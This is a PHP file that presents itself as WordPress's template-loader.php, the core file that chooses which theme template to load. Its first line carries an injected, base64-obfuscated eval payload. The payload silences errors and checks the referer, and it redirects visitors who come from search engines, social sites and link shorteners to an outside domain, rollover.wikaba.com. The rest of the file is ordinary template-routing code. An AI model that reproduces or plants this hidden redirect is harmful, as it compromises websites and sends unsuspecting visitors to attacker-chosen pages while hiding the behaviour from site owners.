<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Loads the correct template based on the visitor's url
 * @package WordPress
 */
if ( defined('WP_USE_THEMES') && constant('WP_USE_THEMES') ) {
	do_action('template_redirect');
	if ( is_robots() ) {
		do_action('do_robots');
		return;
	} else if ( is_feed() ) {
		do_feed();
		return;
	} else if ( is_trackback() ) {
		include(ABSPATH . 'wp-trackback.php');
		return;
	} else if ( is_404() && $template = get_404_template() ) {
		include($template);
		return;
	} else if ( is_search() && $template = get_search_template() ) {
		include($template);
		return;
	} else if ( is_tax() && $template = get_taxonomy_template()) {
		include($template);
		return;
	} else if ( is_home() && $template = get_home_template() ) {
		include($template);
		return;
	} else if ( is_attachment() && $template = get_attachment_template() ) {
		remove_filter('the_content', 'prepend_attachment');
		include($template);
		return;
	} else if ( is_single() && $template = get_single_template() ) {
		include($template);
		return;
	} else if ( is_page() && $template = get_page_template() ) {
		include($template);
		return;
	} else if ( is_category() && $template = get_category_template()) {
		include($template);
		return;
	} else if ( is_tag() && $template = get_tag_template()) {
		include($template);
		return;
	} else if ( is_author() && $template = get_author_template() ) {
		include($template);
		return;
	} else if ( is_date() && $template = get_date_template() ) {
		include($template);
		return;
	} else if ( is_archive() && $template = get_archive_template() ) {
		include($template);
		return;
	} else if ( is_comments_popup() && $template = get_comments_popup_template() ) {
		include($template);
		return;
	} else if ( is_paged() && $template = get_paged_template() ) {
		include($template);
		return;
	} else if ( file_exists(TEMPLATEPATH . "/index.php") ) {
		include(TEMPLATEPATH . "/index.php");
		return;
	}
} else {
	// Process feeds and trackbacks even if not using themes.
	if ( is_robots() ) {
		do_action('do_robots');
		return;
	} else if ( is_feed() ) {
		do_feed();
		return;
	} else if ( is_trackback() ) {
		include(ABSPATH . 'wp-trackback.php');
		return;
	}
}

?>